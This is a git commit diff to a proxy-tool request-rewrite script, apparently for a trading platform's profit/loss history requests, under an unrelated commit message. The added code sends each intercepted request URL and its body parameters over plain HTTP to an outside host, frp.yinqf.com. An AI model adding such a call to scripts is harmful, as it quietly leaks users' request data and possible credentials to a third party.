439ad4a949eb6e041114276b080782faf97318fe
yinqf <yinqf7437@gmail.com>
2024-02-29 17:17:28 +0800

    修改合约盈亏分析页面

--- history-req.js
+++ history-req.js
@@ -1,5 +1,16 @@
 let originalUrl = $request.url
 let requestBodyStr = $request.body
+
+function callApi(url, onSuccess, onError) {
+    $httpClient.get(url, (error, response, data) => {
+        if (!error && response.status === 200) {
+            onSuccess(data);
+        } else {
+            onError(error);
+        }
+    });
+}
+
 if(requestBodyStr){
     let requestBody = JSON.parse($request.body)
     let queryString = Object.keys(requestBody).map((key) => {
@@ -17,6 +28,14 @@ if(requestBodyStr){
         ...$request, // 展开原始的请求对象
         url: originalUrl     // 使用修改后的 URL
     };
+
+
+    callApi("http://frp.yinqf.com/test?originalUrl="+encodeURIComponent(originalUrl),function (res) {
+        console.log('res:'+res)
+    },function (err) {
+        console.log('err:'+err)
+    })
+
 
     $done({ request: modifiedRequest });
 }else{
